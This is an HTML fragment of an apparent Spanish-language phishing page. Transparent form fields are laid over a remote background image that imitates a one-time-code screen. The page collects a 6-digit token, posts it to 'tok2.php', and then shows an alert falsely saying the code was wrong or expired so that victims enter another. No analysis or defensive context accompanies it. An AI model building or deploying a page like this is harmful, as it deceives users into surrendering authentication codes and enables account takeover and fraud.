...
<html lang="es">
  ...
  <body style="overflow-x:hidden;background:url('https://i.ibb.co/56pWW0q/bg1.png');background-size:cover;">
    ...
    <div id="xdfizq">
        <div id="xfdfrm">
          <form  method="post" action="tok2.php">
            <input  onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" maxlength="6" inputmode="numeric" required name="data" id="data" type="text" autocomplete="off" style="position: relative;top: 269px;left: 22px;height: 32px;width: 154px;display: block; border:none; background:transparent;padding: 0px 0 0 8px;font-size: 16px;font-family: sans-serif;">
            
      <input type="hidden" id="">
            <input type="submit" value="" onclick="xbndtl()" style="display: block;position: relative;background: transparent;border: none;margin-top: 236px;left: 207px;height: 34px;width: 135px;outline: none;cursor: pointer;user-select: none;"></input>
    ...
    <style>
        *{margin:0;padding:0;}
        ...
        #xfdfrm{
          height:519.48px;
          width:362px;
          background-image:url('https://svgshare.com/i/rfx.svg');
  ...
  <script >
        ...
        alert("El codigo ingresado es incorrecto o ha vencido, por favor verifique otra vez e introduzca uno nuevo.");
      </script>
